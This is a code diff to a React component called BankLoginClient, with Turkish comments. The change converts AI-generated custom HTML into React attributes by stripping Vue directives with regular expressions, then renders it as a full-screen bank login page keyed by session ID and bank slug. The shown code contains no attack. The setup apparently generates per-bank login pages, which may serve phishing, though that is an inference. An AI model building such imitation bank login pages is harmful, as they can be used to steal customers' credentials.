@@ -251,6 +251,17 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     
     // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
     if (design.customHtml) {
+      // Vue directive'lerini ve class=".." formatlarını React formatına çevir
+      const cleanHtml = design.customHtml
+        .replace(/@submit\.prevent="[^"]*"/g, '')
+        .replace(/@click="[^"]*"/g, '')
+        .replace(/v-model="[^"]*"/g, '')
+        .replace(/v-if="[^"]*"/g, '')
+        .replace(/v-show="[^"]*"/g, '')
+        .replace(/:class="/g, 'className="')
+        .replace(/class="/g, 'className="')
+        .replace(/for="/g, 'htmlFor="');
+
       const options = {
         replace: (domNode: any) => {
           if (domNode instanceof Element) {
@@ -299,7 +310,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       
       return (
         <div className="min-h-screen w-full font-sans antialiased">
-          {parse(design.customHtml, options)}
+          {parse(cleanHtml, options)}
         </div>
       );
     }
